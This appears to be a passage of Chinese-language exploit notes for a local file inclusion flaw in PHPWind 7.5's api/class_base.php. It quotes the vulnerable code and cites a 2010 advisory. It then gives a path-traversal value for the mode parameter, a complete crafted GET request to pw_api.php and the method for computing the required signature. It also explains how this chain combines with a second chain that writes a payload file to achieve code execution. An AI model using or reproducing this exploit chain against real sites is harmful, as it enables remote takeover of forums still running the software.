api/class_base.php L110-117（pw75sp3 源码逐行）：
  function callback($mode, $method, $params) {
      if (!isset($this->classdb[$mode])) {
          if (!file_exists(R_P.'api/class_' . $mode . '.php')) {
              return new ErrorMsg(API_MODE_NOT_EXISTS, "Class($mode) Not Exists");
          }
          require_once Pcv(R_P.'api/class_' . $mode . '.php');     // ← $mode 未过滤，直接拼进 require_once
          $this->classdb[$mode] = new $mode($this);
      }
      ...
  }

$mode 的来源（L96）：$mode = $request['mode'];  其中 $request = $_POST + $_GET
  => **不依赖 register_globals**（PHP 5.4+ 已移除 register_globals，此洞仍成立）
  => pw_api.php 未做 InitGP，**不经 Char_cv/CheckVar 清洗**

对应的公开通报：CN-VA10-02 / 复旦信息化办「PHPWind 7.5 存在多个安全漏洞」（2010-01-18）
原文：「PHPWind 7.5.x 版本后台程序多个文件（/api/class_base.php、/apps/share/example.com、
/apps/groups/example.com）中若干变量在默认安装情况下未进行引用过滤或未完成初始化，
攻击者可以远程执行特定构造的包含 php 命令的代码获得网站管理权限」

限制条件（必须说明）：
  1) file_exists 强制 '.php' 后缀 => 不能用 %00 截断（PHP 5.5.38 已无空字节截断）
  2) 必须指向站上**已存在**的 .php 文件
  3) 仍需 apikey 过 sig 校验（class_base.php L93）

路径穿越写法（api/class_<mode>.php）：
  mode = x/../../data/bbscache/info_class
  => R_P.'api/class_x/../../data/bbscache/info_class.php'
  => 规范化后 = R_P.'data/bbscache/info_class.php'   （'class_x' 是普通目录名，两个 '..' 依次回退 api/ 与 bbs/）

完整请求原文：
GET /bbs/pw_api.php?mode=x%2F..%2F..%2Fdata%2Fbbscache%2Finfo_class&method=anything&type=app&sig=<MD5> HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.20 Safari/537.36

sig 计算：ARG = "method=anything&mode=x/../../data/bbscache/info_class&type=app&"
          SIG = md5(ARG . apikey)

与链二的关系：链二（threadscateGory）负责"写入含 payload 的 info_class.php"，
本链负责"包含执行任意已存在的 .php"。两者都用同一个 sig 机制、同一个 pw_api.php 入口，
互为备用；本链单独使用时需要一个内容可控的已落盘 .php 文件。